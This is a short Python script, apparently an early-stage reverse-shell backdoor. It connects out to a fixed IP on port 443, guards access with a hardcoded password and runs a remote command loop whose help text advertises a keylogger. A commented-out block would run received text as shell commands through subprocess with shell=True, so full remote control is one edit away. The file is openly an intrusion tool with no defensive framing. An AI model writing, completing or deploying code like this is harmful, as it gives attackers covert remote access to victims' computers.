import subprocess
import socket

host = '192.168.1.7'
port = 443
passwd = "hello"

def Login():
    global s
    s.send("Login: ".encode())
    pwd = s.recv(1024)
    if pwd.decode().strip() != passwd:
        Login()
    else:
        s.send("Connected #> ".encode())
        Shell()


def Shell():
    while(True):
        data = s.recv(1024)

        if data.decode().strip() == ":kill":
            break
        elif data.decode().strip() == "-help":
            s.send("\nCommands available so far: \n   #> View User ID \n   #> View IP \n   #> Keylogger \n\n".encode())
        elif data.decode().strip() == "view ip".strip():
            s.send(socket.gethostbyname(socket.gethostname()).encode())
        else:
            s.send("Type: '-help' for a list of commands \n".encode())
        #proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        #output = proc.stdout.read() + proc.stderr.read()
        #s.send(output)
        s.send("#> ".encode())

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
